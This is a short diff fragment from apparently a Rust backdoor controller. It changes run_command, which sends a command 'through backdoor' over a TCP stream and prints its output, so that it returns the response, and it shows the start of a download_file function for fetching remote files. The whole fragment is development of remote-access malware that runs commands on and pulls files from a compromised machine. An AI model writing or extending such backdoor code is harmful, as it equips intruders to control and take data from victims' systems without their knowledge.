@@ -20,7 +20,7 @@ fn send_request(req: impl Serialize + MessageType, stream: &mut TcpStream) -> Re
     Ok(())
 }
 
-pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Error> {
+pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<RunCommandResponse, Error> {
     println!("Running command {} through backdoor.", command);
     let req = RunCommandRequest {
         command,
@@ -41,7 +41,7 @@ pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Er
     println!("Output: {:?} ", &response.output);
     println!("Error info: {:?}", response.error_info);
 
-    Ok(())
+    Ok(response)
 }
 
 pub fn download_file(remote_path: String, _local_path: String, mut stream: &mut TcpStream) {
